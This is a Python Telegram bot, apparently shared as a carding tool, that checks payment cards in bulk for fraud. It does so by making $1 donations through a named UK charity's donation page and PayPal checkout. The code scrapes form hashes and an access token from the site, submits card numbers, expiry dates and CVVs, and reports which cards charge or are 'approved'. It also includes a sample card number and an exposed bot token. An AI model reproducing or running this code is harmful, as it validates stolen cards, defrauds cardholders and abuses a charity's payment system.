#!/usr/bin/env python3
"""
PayPal $1 Checker - Aiogram 3.x
Owner: @TomanSamurai (7926510116)
"""

import asyncio
import aiohttp
import aiofiles
import time
import re
import base64
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# Bot Configuration
TOKEN = os.environ.get('8568309620:AAFR8RVCtmCksaQyWxHjqFVyR6_LsLeBfPM')
OWNER_ID = 8568309620

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

stopuser = {}
command_usage = {}


def luhn_check(number: str) -> bool:
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def reg(cc: str):
    parts = [p for p in re.split(r'\D+', cc) if p != '']
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        
        if len(yy) == 4 and (yy.startswith('20') or yy.startswith('19')):
            pass
        elif len(yy) == 1:
            return None
            
        is_amex = pan.startswith('34') or pan.startswith('37')
        expected_pan_len = 15 if is_amex else 16
        expected_cvc_len = 4 if is_amex else 3

        if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
            return None
        if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
            return None
        if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
            return None
        if not re.fullmatch(r'\d{%d}' % expected_cvc_len, cvc):
            return None
        if not luhn_check(pan):
            return None

        return f"{pan}|{mm}|{yy}|{cvc}"

    digits = ''.join(re.findall(r'\d', cc))
    if not digits:
        return None

    is_amex = digits.startswith('34') or digits.startswith('37')
    cvc_len = 4 if is_amex else 3
    min_len = (15 if is_amex else 16) + 2 + 2 + cvc_len
    
    if len(digits) < min_len:
        return None

    cvc = digits[-cvc_len:]
    rest = digits[:-cvc_len]

    yy_candidate = rest[-2:]
    mm_candidate = rest[-4:-2]
    pan_candidate = rest[:-4]

    if len(rest) >= 6 and rest[-4:-2] in ('20', '19'):
        yy = rest[-4:]
        mm = rest[-6:-4]
        pan = rest[:-6]
    else:
        yy = yy_candidate
        mm = mm_candidate
        pan = pan_candidate

    mm = mm.zfill(2)
    expected_pan_len = 15 if (pan.startswith('34') or pan.startswith('37')) else 16
    
    if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
        return None
    if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
        return None
    if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
        return None
    if not re.fullmatch(r'\d{%d}' % cvc_len, cvc):
        return None
    if not luhn_check(pan):
        return None

    return f"{pan}|{mm}|{yy}|{cvc}"


async def check_card(ccx: str, max_retries=3):
    for attempt in range(max_retries):
        try:
            ccx = ccx.strip()
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3].strip()
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get("https://stockportmecfs.co.uk/donate-now/", headers=headers) as r1:
                    text1 = await r1.text()
                
                form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', text1)
                form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', text1)
                form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', text1)
                enc_token = re.search(r'"data-client-token":"(.*?)"', text1)
                
                if not all([form_hash, form_prefix, form_id, enc_token]):
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2)
                        continue
                    return "PARSING_ERROR"
                
                form_hash = form_hash.group(1)
                form_prefix = form_prefix.group(1)
                form_id = form_id.group(1)
                enc_token = enc_token.group(1)
                
                access_token_match = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token).decode('utf-8'))
                if not access_token_match:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2)
                        continue
                    return "PARSING_ERROR"
                access_token = access_token_match.group(1)

                payload_create = {
                    'give-form-id-prefix': form_prefix,
                    'give-form-id': form_id,
                    'give-form-hash': form_hash,
                    'give-amount': "1.00",
                    'payment-mode': 'paypal-commerce',
                    'give_first': 'John',
                    'give_last': 'Doe',
                    'give_email': f'test{int(time.time())}@gmail.com',
                    'give-gateway': 'paypal-commerce'
                }
                
                async with session.post(
                    "https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order",
                    data=payload_create,
                    headers=headers
                ) as r2:
                    result = await r2.json()
                    order_id = result['data']['id']

                payload_confirm = {
                    "payment_source": {
                        "card": {
                            "number": n,
                            "expiry": f"20{yy}-{mm}",
                            "security_code": cvc
                        }
                    }
                }
                
                async with session.post(
                    f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                    json=payload_confirm,
                    headers={
                        'Authorization': f"Bearer {access_token}",
                        'Content-Type': 'application/json'
                    }
                ) as r3:
                    await r3.text()

                async with session.post(
                    f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}",
                    data=payload_create,
                    headers=headers
                ) as r4:
                    text4 = await r4.text()
                
                if any(x in text4.lower() for x in ['thank', 'thanks', 'true']):
                    return 'CHARGE 1.00$'
                elif 'INSUFFICIENT_FUNDS' in text4:
                    return "INSUFFICIENT_FUNDS"
                elif 'CVV2_FAILURE' in text4:
                    return "CVV2_FAILURE"
                elif 'DECLINED' in text4:
                    return "DECLINED"
                else:
                    return "ORDER_NOT_APPROVED"
        
        except asyncio.TimeoutError:
            if attempt < max_retries - 1:
                await asyncio.sleep(2)
                continue
            return "TIMEOUT_ERROR"
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(2)
                continue
            return f"ERROR: {str(e)}"
    
    return "MAX_RETRIES_EXCEEDED"


async def dato(zh: str):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{zh}", headers=headers) as response:
                if response.status == 200:
                    api_url = await response.json()
                    brand = api_url.get("brand", "Unknown")
                    card_type = api_url.get("type", "Unknown")
                    level = api_url.get("level", "Unknown")
                    bank = api_url.get("bank", "Unknown")
                    country_name = api_url.get("country_name", "Unknown")
                    country_flag = api_url.get("country_flag", "🏳️")
                    
                    mn = f'''[<a href="https://t.me/TomanSamurai">ϟ</a>] 𝐁𝐢𝐧: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/TomanSamurai">ϟ</a>] 𝐁𝐚𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/TomanSamurai">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
                    return mn
                else:
                    return '[<a href="https://t.me/TomanSamurai">ϟ</a>] 𝐁𝐢𝐧: <code>Info not available</code>'
    except Exception:
        return '[<a href="https://t.me/TomanSamurai">ϟ</a>] 𝐁𝐢𝐧: <code>Info not available</code>'


@dp.message(Command("start"))
async def handle_start(message: types.Message):
    sent_message = await message.answer("⚡ <i>Initializing...</i>")
    await asyncio.sleep(1)
    name = message.from_user.first_name
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Start Checking", callback_data="start")]
    ])
    
    welcome_text = f"""
<b>TOMAN CHECKER</b>

Welcome, <b>{name}</b>

<i>Premium PayPal Card Checker</i>

<b>Features:</b>
• Lightning Fast Checking
• Real-time Results
• Bulk File Support
• Async Technology

<b>Commands:</b>
• <code>/pp</code> - Single Card Check
• <code>.pp</code> - Alternative Command
• Send File - Bulk Checking

<i>Dev by @TomanSamurai</i>
"""
    
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=sent_message.message_id,
        text=welcome_text,
        reply_markup=keyboard
    )


@dp.callback_query(F.data == "start")
async def handle_start_button(callback: types.CallbackQuery):
    name = callback.from_user.first_name
    
    info_text = """
<b>HOW TO USE</b>

<b>Single Card Check:</b>
• Use: <code>/pp CARD|MM|YY|CVV</code>
• Example: <code>/pp 4340762019462213|09|28|825</code>

<b>Bulk File Check:</b>
• Upload .txt file with cards
• Format: One card per line
• Click button to start checking

<b>Card Format:</b>
• <code>XXXXXXXXXXXXXXXX|MM|YYYY|CVV</code>
• <code>XXXXXXXXXXXXXXXX|MM|YY|CVV</code>

<b>Status Codes:</b>
• <b>CHARGE</b> - Successful charge
• <b>INSUFFICIENT_FUNDS</b> - Valid card
• <b>DECLINED</b> - Card declined
• <b>CVV_FAILURE</b> - Wrong CVV

<i>Developed by @TomanSamurai</i>
"""
    
    await callback.message.answer(info_text)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Start Checking", callback_data="start")]
    ])
    
    await callback.message.edit_text(
        text=f"<b>Welcome back, {name}!</b>\n\n<i>Ready to check cards?</i>",
        reply_markup=keyboard
    )
    await callback.answer()


@dp.message(Command("pp"))
async def handle_pp_command(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in command_usage:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[user_id]['last_time']).seconds
        if time_diff < 10:
            await message.reply(
                f"⏳ <b>Rate Limit!</b>\n\n"
                f"<i>Please wait <code>{10-time_diff}</code> seconds before next check.</i>"
            )
            return
    
    ko = await message.reply("⚡ <i>Processing your card...</i>")
    
    try:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text.replace('/pp', '').replace('.pp', '').strip()
    except:
        cc = message.text.replace('/pp', '').replace('.pp', '').strip()
    
    cc = str(reg(cc))
    
    if cc == 'None':
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=ko.message_id,
            text="""
<b>INVALID FORMAT</b>

Card format is incorrect!

<b>Correct Format:</b>
• <code>XXXXXXXXXXXXXXXX|MM|YYYY|CVV</code>
• <code>XXXXXXXXXXXXXXXX|MM|YY|CVV</code>

<b>Example:</b>
• <code>4340762019462213|09|2028|825</code>

<i>Please try again with correct format.</i>
"""
        )
        return
    
    start_time = time.time()
    
    try:
        command_usage[user_id] = {'last_time': datetime.now()}
        last = await check_card(cc)
    except Exception as e:
        last = f'Error {e}'
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    bin_info = await dato(cc[:6])
    
    if 'CHARGE 1.00$' in last:
        status_text = "CHARGED"
    elif 'INSUFFICIENT_FUNDS' in last:
        status_text = "APPROVED"
    else:
        status_text = "DECLINED"
    
    msg = f"""
<b>PAYPAL $1</b>

<b>Card:</b> <code>{cc}</code>
<b>Status:</b> <code>{status_text}</code>
<b>Response:</b> <code>{last}</code>

<b>BIN Details:</b>
{bin_info}

<b>Time:</b> <code>{execution_time:.2f}s</code>
<b>Checked by:</b> <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>

<b>Toman Checker</b> | Dev: @TomanSamurai
"""
    
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=ko.message_id,
        text=msg
    )


@dp.message(F.text.startswith('.pp'))
async def handle_pp_dot_command(message: types.Message):
    await handle_pp_command(message)


@dp.message(F.document)
async def handle_document(message: types.Message):
    user_id = str(message.from_user.id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Start Bulk Check', callback_data='ottpa2')]
    ])
    
    upload_text = """
<b>FILE UPLOADED</b>

File received successfully!

<b>Next Steps:</b>
• Click button below to start
• Processing will begin automatically
• Results sent in real-time

<b>Features:</b>
• Concurrent checking
• Live progress updates
• Approved cards sent instantly

<i>Click the button when ready!</i>
"""
    
    await message.reply(upload_text, reply_markup=keyboard)
    
    try:
        file_id = message.document.file_id
        file = await bot.get_file(file_id)
        filename = f"com{user_id}.txt"
        
        file_content = await bot.download_file(file.file_path)
        
        with open(filename, 'wb') as f:
            f.write(file_content.read())
    except Exception as e:
        await message.answer(f"❌ <b>Error downloading file:</b>\n<i>{e}</i>")


@dp.callback_query(F.data == "ottpa2")
async def handle_file_check(callback: types.CallbackQuery):
    user_id = str(callback.from_user.id)
    passs = 0
    basl = 0
    filename = f"com{user_id}.txt"
    
    try:
        await callback.message.edit_text(
            "<b>PROCESSING FILE</b>\n\n"
            "<i>Loading cards...</i>"
        )
        
        if not os.path.exists(filename):
            await callback.message.edit_text(
                "<b>FILE NOT FOUND</b>\n\n"
                "<i>Please upload the file again.</i>"
            )
            await callback.answer()
            return
        
        async with aiofiles.open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            lines = await file.readlines()
            cards = [line.strip() for line in lines if line.strip()]
            total = len(cards)
            stopuser.setdefault(user_id, {})['status'] = 'start'
            
            batch_size = 10
            for i in range(0, len(cards), batch_size):
                if stopuser.get(user_id, {}).get('status') == 'stop':
                    await callback.message.edit_text(
                        f"""
<b>CHECKER STOPPED</b>

<b>Approved:</b> <code>{passs}</code>
<b>Declined:</b> <code>{basl}</code>
<b>Total:</b> <code>{passs + basl}/{total}</code>

<i>Check stopped by user.</i>

<b>Toman Checker</b> | @TomanSamurai
"""
                    )
                    try:
                        await callback.answer()
                    except:
                        pass
                    return
                
                batch = cards[i:i+batch_size]
                batch_parsed = []
                tasks = []
                
                for cc in batch:
                    if cc:
                        cc_parsed = reg(cc)
                        if cc_parsed:
                            batch_parsed.append(cc_parsed)
                            tasks.append(check_card(cc_parsed))
                
                if not tasks:
                    continue
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for cc_parsed, result in zip(batch_parsed, results):
                    if isinstance(result, Exception):
                        result = "ERROR"
                    
                    if 'CHARGE 1.00$' in str(result) or 'INSUFFICIENT_FUNDS' in str(result) or 'CVV2_FAILURE' in str(result):
                        passs += 1
                        bin_info = await dato(cc_parsed[:6])
                        
                        if 'CHARGE 1.00$' in str(result):
                            status_text = "CHARGED"
                        else:
                            status_text = "APPROVED"
                        
                        msg = f"""
<b>PAYPAL $1</b>

<b>Card:</b> <code>{cc_parsed}</code>
<b>Status:</b> <code>{status_text}</code>
<b>Response:</b> <code>{result}</code>

<b>BIN Info:</b>
{bin_info}

<b>Progress:</b> <code>{passs + basl}/{total}</code>
<b>Dev by:</b> @TomanSamurai
"""
                        try:
                            await bot.send_message(callback.from_user.id, msg)
                        except Exception:
                            pass
                    else:
                        basl += 1
                
                progress_text = f"""
<b>CHECKING IN PROGRESS</b>

<b>Approved:</b> <code>{passs}</code>
<b>Declined:</b> <code>{basl}</code>
<b>Progress:</b> <code>{passs + basl}/{total}</code>

<i>Processing cards...</i>
"""
                
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=f"Approved: {passs}", callback_data='x')],
                    [InlineKeyboardButton(text=f"Declined: {basl}", callback_data='x')],
                    [InlineKeyboardButton(text=f"Total: {passs + basl}/{total}", callback_data='x')],
                    [InlineKeyboardButton(text="Stop Checker", callback_data='stop')]
                ])
                
                try:
                    await callback.message.edit_text(progress_text, reply_markup=keyboard)
                except Exception:
                    pass
                
                await asyncio.sleep(1)
        
        success_rate = (passs / (passs + basl) * 100) if (passs + basl) > 0 else 0
        
        await callback.message.edit_text(
            f"""
<b>CHECK COMPLETE</b>

<b>Approved:</b> <code>{passs}</code>
<b>Declined:</b> <code>{basl}</code>
<b>Total Checked:</b> <code>{passs + basl}</code>
<b>Success Rate:</b> <code>{success_rate:.1f}%</code>

<i>All approved cards have been sent.</i>

<b>Toman Checker</b> | Dev: @TomanSamurai
"""
        )
    
    except Exception as e:
        await callback.message.edit_text(f"❌ Error: {type(e).__name__}")
    
    try:
        await callback.answer()
    except:
        pass


@dp.callback_query(F.data == "stop")
async def handle_stop(callback: types.CallbackQuery):
    uid = str(callback.from_user.id)
    stopuser.setdefault(uid, {})['status'] = 'stop'
    await callback.answer("Stopped ✅")


async def main():
    print('🚀 Toman Checker Starting...')
    print(f'👤 Owner: @TomanSamurai ({OWNER_ID})')
    print(f'⚡ Using uvloop: {asyncio.get_event_loop_policy().__class__.__name__}')
    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())
